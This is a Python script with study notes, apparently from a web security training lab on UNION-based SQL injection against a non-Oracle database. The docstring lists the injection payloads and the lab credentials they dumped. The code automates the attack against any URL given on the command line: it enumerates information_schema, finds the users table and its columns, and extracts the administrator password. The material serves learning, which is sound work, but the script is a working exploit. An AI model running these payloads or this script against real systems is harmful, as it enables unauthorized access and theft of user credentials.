"""
Listing the contents of the non oracle database 


Most database types (except Oracle) have a set of views called the information schema. This provides information about the database(metadata).

query information_schema.tables to list the tables in the dataabse 
SELECT * FROM information_schema.tables

query information_schema.columns to list the columns in individual tables

SQLI attack listing the databse contents on non-oracle databases 

2 columns 

are there of string data type 

retreived table names from the non-oracle database
' UNION SELECT table_name,NULL from information_schema.tables --

table to look after users_hblvrz

column 

' UNION SELECT column_name,NULL from information_schema.columns where table_name='users_hblvrz'--

THE TABLE HAS THESE COLUMNS 

password_jvtggm
username_dpohri
email

i have to login as administrator 

' UNION SELECT username_dpohri,password_jvtggm from users_hblvrz--


administrator
	8742rwveqmy4c4n6wjpg
wiener
	20d00w8nx8jb1ppr7759
carlos
	h792cip75ap00r6p13me

"""

import requests
import sys 
import urllib3
import re 
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perform_request(url, payload):
    uri="/filter?category="
    r = requests.get(url + uri + payload, verify=False)
    return r.text

def sqli_users_table(url):
    uri="/filter?category="
    payload="' UNION SELECT table_name,NULL from information_schema.tables --"
    response=perform_request(url, payload)
    soup=BeautifulSoup(response, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for a users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" % users_table)
        # step #5
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s" % password_column)

            # step #6
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("Did not find the username and/or the password columns.")

    else:
        print("Did not find a users table.")